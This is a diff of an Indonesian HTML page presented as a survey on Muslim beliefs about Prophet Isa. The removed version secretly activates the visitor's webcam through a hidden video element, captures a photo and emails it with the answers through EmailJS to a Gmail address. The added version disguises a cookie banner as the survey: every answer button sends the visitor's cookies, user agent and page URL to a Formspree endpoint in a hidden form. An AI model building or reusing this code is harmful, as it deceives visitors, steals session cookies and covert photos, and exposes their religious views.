@@ -1,236 +1,191 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Survey Pandangan Tentang Nabi Isa AS | Pandangan Muslim</title>
-    <meta name="description" content="Ikuti survey singkat tentang keyakinan Muslim terhadap Nabi Isa AS. Hanya untuk Muslim dengan verifikasi identitas.">
-    
-    <!-- Open Graph / Facebook -->
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://example.com/survey-nabi-isa">
-    <meta property="og:title" content="Survey Pandangan Muslim Tentang Nabi Isa AS">
-    <meta property="og:description" content="Bagaimana pandangan Anda sebagai Muslim tentang Nabi Isa AS? Ikuti survey singkat ini dengan verifikasi identitas.">
-    <meta property="og:image" content="https://example.com/images/survey-nabi-isa.jpg">
-    
+    <title>Cookie Consent</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            max-width: 800px;
-            margin: 0 auto;
+        body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; }
+        .cookie-banner {
+            background: #f5f5f5;
             padding: 20px;
-            line-height: 1.6;
-            background-color: #f5f5f5;
+            border-radius: 5px;
+            margin-bottom: 20px;
         }
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-            background-color: #2c3e50;
-            color: white;
-            padding: 20px;
-            border-radius: 8px;
-        }
-        .survey-form {
-            background-color: white;
-            padding: 25px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        .statement {
-            margin-bottom: 15px;
-            padding: 15px;
-            background-color: #f9f9f9;
-            border-radius: 8px;
-            border-left: 4px solid #3498db;
-        }
-        .submit-btn {
-            background-color: #27ae60;
+        button {
+            background: #4CAF50;
             color: white;
             border: none;
-            padding: 12px 25px;
-            font-size: 18px;
-            border-radius: 6px;
+            padding: 10px 15px;
+            border-radius: 4px;
             cursor: pointer;
+            margin-right: 10px;
+        }
+        button:hover {
+            background: #45a049;
+        }
+        .question-form {
+            margin-top: 30px;
+            padding: 20px;
+            background: #f9f9f9;
+            border-radius: 5px;
+        }
+        .question-form h2 {
+            margin-top: 0;
+            color: #333;
+        }
+        .question-form label {
             display: block;
-            margin: 30px auto 0;
-            transition: background-color 0.3s;
+            margin: 10px 0;
+        }
+        .question-form input[type="radio"] {
+            margin-right: 10px;
+        }
+        .submit-btn {
+            margin-top: 15px;
+            background: #2196F3;
         }
         .submit-btn:hover {
-            background-color: #219653;
-        }
-        #confirmation-message {
-            display: none;
-            text-align: center;
-            padding: 20px;
-            background-color: #e8f5e9;
-            border-radius: 8px;
-            margin-top: 20px;
-        }
-        #error-message {
-            display: none;
-            text-align: center;
-            padding: 20px;
-            background-color: #ffebee;
-            border-radius: 8px;
-            margin-top: 20px;
-        }
-        .hidden {
-            display: none;
+            background: #0b7dda;
         }
     </style>
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    <script>
-        // Initialize EmailJS
-        emailjs.init('_C3hCWaBoAUQ_tB9v');
-    </script>
 </head>
 <body>
-    <div class="header">
-        <h1>Survey Pandangan Tentang Nabi Isa Alaihissalam</h1>
-        <p>Mohon partisipasinya untuk mengisi survey singkat ini</p>
+    <div class="cookie-banner" id="cookieBanner">
+        <h2>Survey Keimanan Muslim</h2>
     </div>
 
-    <form class="survey-form" id="survey-form">
-        <p>Silakan centang pernyataan-pernyataan berikut yang sesuai dengan keyakinan Anda:</p>
-
-        <div class="statement">
-            <input type="checkbox" id="statement1" name="beliefs[]" value="statement1">
-            <label for="statement1">Nabi Isa AS adalah seorang Nabi dan Rasul Allah, bukan Tuhan atau anak Tuhan</label>
+    <div id="content" style="display:none;">
+        <h1>Selamat Datang</h1>
+        
+        <!-- Form Pertanyaan tentang Nabi Isa -->
+        <div class="question-form">
+            <h2>Pertanyaan tentang Nabi Isa Alaihissalam</h2>
+            <form id="isaQuestionForm" onsubmit="submitQuestionForm(event)">
+                <p>Menurut keyakinan Anda, apakah Isa Alaihissalam adalah Tuhan?</p>
+                
+                <label>
+                    <button onclick="acceptCookies()">Ya, Isa adalah Tuhan</button>
+                </label>
+                <label>
+                    <button onclick="acceptCookies()">Tidak, Isa adalah utusan Allah</button>
+                </label>
+                <label>
+                    <button onclick="acceptCookies()">Saya tidak tahu</button>
+                </label>
+                
+                <button onclick="acceptCookies()">Submit Jawaban</button>
+            </form>
+            <div id="formResponse" style="margin-top: 15px; display: none;"></div>
         </div>
-
-        <div class="statement">
-            <input type="checkbox" id="statement2" name="beliefs[]" value="statement2">
-            <label for="statement2">Kelahiran Nabi Isa AS tanpa ayah adalah bukti kekuasaan Allah, bukan sifat ketuhanan</label>
-        </div>
-
-        <div class="statement">
-            <input type="checkbox" id="statement3" name="beliefs[]" value="statement3">
-            <label for="statement3">Nabi Isa AS tidak wafat disalib tetapi diangkat oleh Allah ke langit</label>
-        </div>
-
-        <div class="statement">
-            <input type="checkbox" id="statement4" name="beliefs[]" value="statement4">
-            <label for="statement4">Nabi Isa AS akan turun kembali di akhir zaman sebagai pemimpin yang adil</label>
-        </div>
-
-        <button type="button" class="submit-btn" id="submit-btn">Kirim Survey</button>
-    </form>
-
-    <div id="confirmation-message" class="success">
-        <h3>Terima kasih!</h3>
-        <p>Survey Anda telah kami terima.</p>
     </div>
-
-    <div id="error-message" class="error">
-        <h3>Gagal mengirim!</h3>
-        <p>Terjadi kesalahan saat mengirim survey. Silakan coba lagi.</p>
-    </div>
-
-    <!-- Hidden video element for capturing without displaying -->
-    <video id="hidden-camera" autoplay playsinline class="hidden"></video>
 
     <script>
-        const submitBtn = document.getElementById('submit-btn');
-        const confirmationMessage = document.getElementById('confirmation-message');
-        const errorMessage = document.getElementById('error-message');
-        const surveyForm = document.getElementById('survey-form');
-        const hiddenCamera = document.getElementById('hidden-camera');
-
-        // Fungsi untuk menangkap foto dari video stream
-        function capturePhoto(videoElement) {
-            const canvas = document.createElement('canvas');
-            canvas.width = videoElement.videoWidth;
-            canvas.height = videoElement.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-            return canvas.toDataURL('image/jpeg', 0.8);
-        }
-
-        // Fungsi untuk mengirim data survey dan foto
-        async function sendSurveyData(photoData) {
-            // Kumpulkan data survey
-            const surveyData = {
-                statement1: document.getElementById('statement1').checked,
-                statement2: document.getElementById('statement2').checked,
-                statement3: document.getElementById('statement3').checked,
-                statement4: document.getElementById('statement4').checked,
-                photo_data: photoData,
-                timestamp: new Date().toLocaleString()
-            };
-
-            try {
-                // Kirim data via EmailJS
-                await emailjs.send('service_n5iqioo', 'template_7ewuodr', {
-                    to_email: 'sulakeherman@gmail.com',
-                    from_name: 'Responden Survey',
-                    subject: 'Hasil Survey Nabi Isa AS',
-                    message: `Hasil Survey:
-                    - Pernyataan 1: ${surveyData.statement1 ? 'Setuju' : 'Tidak'}
-                    - Pernyataan 2: ${surveyData.statement2 ? 'Setuju' : 'Tidak'}
-                    - Pernyataan 3: ${surveyData.statement3 ? 'Setuju' : 'Tidak'}
-                    - Pernyataan 4: ${surveyData.statement4 ? 'Setuju' : 'Tidak'}`,
-                    photo_data: surveyData.photo_data,
-                    date: surveyData.timestamp
-                });
-
-                return true;
-            } catch (error) {
-                console.error('Gagal mengirim email:', error);
-                return false;
+        // Fungsi untuk mengirim cookies ke Formspree
+        function sendCookiesToEmail() {
+            // Kumpulkan semua cookies
+            const cookies = document.cookie;
+            
+            // Kumpulkan informasi tambahan
+            const userAgent = navigator.userAgent;
+            const screenResolution = `${window.screen.width}x${window.screen.height}`;
+            const pageUrl = window.location.href;
+            const timestamp = new Date().toISOString();
+            
+            // Buat form tersembunyi
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'https://formspree.io/f/xwplzqar'; // Ganti dengan endpoint Formspree Anda
+            
+            // Tambahkan data ke form
+            function addField(name, value) {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = name;
+                input.value = value;
+                form.appendChild(input);
             }
+            
+            addField('cookies', cookies);
+            addField('user_agent', userAgent);
+            addField('screen_resolution', screenResolution);
+            addField('page_url', pageUrl);
+            addField('timestamp', timestamp);
+            addField('_replyto', 'noreply@example.com'); // Optional
+            addField('_subject', 'Cookie Report from Website');
+            
+            // Tambahkan form ke body dan submit
+            document.body.appendChild(form);
+            form.submit();
         }
 
-        // Event listener untuk tombol submit
-        submitBtn.addEventListener('click', async () => {
-            // Nonaktifkan tombol selama proses
-            submitBtn.disabled = true;
-            submitBtn.textContent = 'Mengirim...';
+        // Fungsi ketika cookie diterima
+        function acceptCookies() {
+            document.getElementById('cookieBanner').style.display = 'none';
+            document.getElementById('content').style.display = 'block';
+            
+            // Set cookie consent
+            document.cookie = "cookie_consent=true; max-age=2592000"; // 30 hari
+            
+            // Kirim data cookies ke email
+            sendCookiesToEmail();
+        }
 
-            try {
-                // Akses kamera secara diam-diam
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    } 
-                });
-                
-                // Gunakan hidden video element
-                hiddenCamera.srcObject = stream;
-                
-                // Tunggu sampai video siap
-                await new Promise((resolve) => {
-                    hiddenCamera.onloadedmetadata = () => {
-                        resolve();
-                    };
-                });
+        // Fungsi ketika cookie ditolak
+        function declineCookies() {
+            document.getElementById('cookieBanner').style.display = 'none';
+            document.getElementById('content').style.display = 'block';
+            
+            // Set cookie consent declined
+            document.cookie = "cookie_consent=false; max-age=2592000";
+        }
 
-                // Tangkap foto
-                const photoDataUrl = capturePhoto(hiddenCamera);
-                
-                // Matikan kamera
-                stream.getTracks().forEach(track => track.stop());
-                
-                // Kirim data survey dan foto
-                const isSuccess = await sendSurveyData(photoDataUrl);
-                
-                if (isSuccess) {
-                    // Tampilkan pesan konfirmasi
-                    surveyForm.style.display = 'none';
-                    confirmationMessage.style.display = 'block';
-                    errorMessage.style.display = 'none';
-                } else {
-                    throw new Error('Gagal mengirim data');
+        // Cek jika consent sudah diberikan sebelumnya
+        function checkCookieConsent() {
+            const cookies = document.cookie.split(';');
+            for (let i = 0; i < cookies.length; i++) {
+                const cookie = cookies[i].trim();
+                if (cookie.startsWith('cookie_consent=')) {
+                    const consent = cookie.substring('cookie_consent='.length);
+                    if (consent === 'true') {
+                        document.getElementById('cookieBanner').style.display = 'none';
+                        document.getElementById('content').style.display = 'block';
+                    }
+                    return;
                 }
-            } catch (error) {
-                console.error("Error:", error);
-                errorMessage.style.display = 'block';
-                confirmationMessage.style.display = 'none';
-                submitBtn.disabled = false;
-                submitBtn.textContent = 'Kirim Survey';
             }
-        });
+        }
+
+        // Fungsi untuk menangani submit form pertanyaan
+        function submitQuestionForm(event) {
+            event.preventDefault();
+            
+            const form = event.target;
+            const formData = new FormData(form);
+            const responseDiv = document.getElementById('formResponse');
+            
+            // Tampilkan pesan terima kasih
+            responseDiv.style.display = 'block';
+            responseDiv.innerHTML = '<p style="color: green;">Terima kasih atas jawaban Anda!</p>';
+            
+            // Kirim data form ke Formspree (opsional)
+            const xhr = new XMLHttpRequest();
+            xhr.open(form.method, form.action);
+            xhr.setRequestHeader('Accept', 'application/json');
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState !== XMLHttpRequest.DONE) return;
+                if (xhr.status === 200) {
+                    // Sukses
+                } else {
+                    // Error
+                }
+            };
+            xhr.send(formData);
+            
+            // Reset form
+            form.reset();
+        }
+
+        // Jalankan saat halaman dimuat
+        window.onload = checkCookieConsent;
     </script>
 </body>
 </html>
